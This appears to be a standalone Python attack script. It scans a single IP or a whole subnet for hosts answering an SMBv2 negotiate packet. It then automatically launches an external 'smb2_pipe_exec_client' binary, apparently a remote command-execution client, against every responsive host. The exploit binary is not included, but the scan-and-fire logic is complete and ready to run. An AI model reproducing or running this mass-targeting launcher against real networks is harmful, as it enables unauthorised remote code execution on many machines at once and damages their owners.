#!/usr/bin/env python3

import sys
import socket
import subprocess
import ipaddress
import concurrent.futures

def smb2_scanner(target_ip, target_port=445):
    smb2_negotiate_packet = (
        b"\x00"
        b"\x00\x00\x54"
        b"\xfeSMB"
        b"\x40\x00"
        b"\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x01\x00"
        b"\x00\x00"
        b"\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x24\x00"
        b"\x01\x00"
        b"\x00\x00"
        b"\x00\x00"
        b"\x7f\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x02\x00"
        b"\x00\x00"
        b"\x02\x02"
    )
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((target_ip, target_port))
            s.sendall(smb2_negotiate_packet)
            response = s.recv(1024)
        if b"\xfeSMB" in response:
            print(f"[+] {target_ip}:{target_port} supports SMBv2 (or higher).")
            return True
        else:
            print(f"[-] {target_ip}:{target_port} did not respond with SMBv2.")
            return False
    except Exception as e:
        print(f"[-] Error scanning {target_ip}:{target_port} -> {e}")
        return False

def run_smb2_pipe_exec_client(target_ip, target_port=445):
    try:
        print("[*] Running smb2_pipe_exec_client...")
        result = subprocess.run(["./smb2_pipe_exec_client", target_ip, str(target_port)])
        print(f"[*] smb2_pipe_exec_client returned with code: {result.returncode}")
    except FileNotFoundError:
        print("[-] Error: smb2_pipe_exec_client not found or not executable.")
    except Exception as e:
        print(f"[-] Error running smb2_pipe_exec_client -> {e}")

def scan_subnet(subnet, port=445):
    smb2_hosts = []
    net = ipaddress.ip_network(subnet, strict=False)
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(smb2_scanner, str(ip), port): str(ip) for ip in net.hosts()}
        for future in concurrent.futures.as_completed(futures):
            ip = futures[future]
            if future.result():
                smb2_hosts.append(ip)
    return smb2_hosts

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [port] or {sys.argv[0]} <subnet> [port]")
        sys.exit(1)

    if len(sys.argv) == 3:
        try:
            port = int(sys.argv[2])
        except ValueError:
            port = 445
    else:
        port = 445

    target = sys.argv[1]

    if '/' in target:
        print(f"[*] Scanning subnet {target} on port {port}...")
        smb2_hosts = scan_subnet(target, port)
        for host in smb2_hosts:
            run_smb2_pipe_exec_client(host, port)
    else:
        print(f"[*] Scanning {target}:{port} for SMBv2...")
        if smb2_scanner(target, port):
            run_smb2_pipe_exec_client(target, port)